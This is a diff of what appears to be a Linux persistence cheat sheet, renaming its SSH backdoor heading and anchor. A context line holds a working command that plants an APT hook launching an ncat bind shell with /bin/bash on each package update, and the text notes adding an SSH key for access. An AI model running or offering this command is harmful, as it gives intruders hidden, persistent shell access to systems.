@@ -11,7 +11,7 @@
 * [Backdooring a user startup file](#backdooring-an-user-startup-file)
 * [Backdooring a driver](#backdooring-a-driver)
 * [Backdooring the APT](#backdooring-the-apt)
-* [Backdooring the SSH](#backdooring-the-ssh)
+* [Backdooring the SSH](#BackdooringSSH)
 * [Tips](#tips)
 * [Additional Linux Persistence Options](#additional-persistence-options)
 * [References](#references)
@@ -126,7 +126,7 @@ Next time "apt-get update" is done, your CMD will be executed!
 echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
 ```
 
-## Backdooring the SSH
+## BackdooringSSH
 
 Add an ssh key into the `~/.ssh` folder.
 
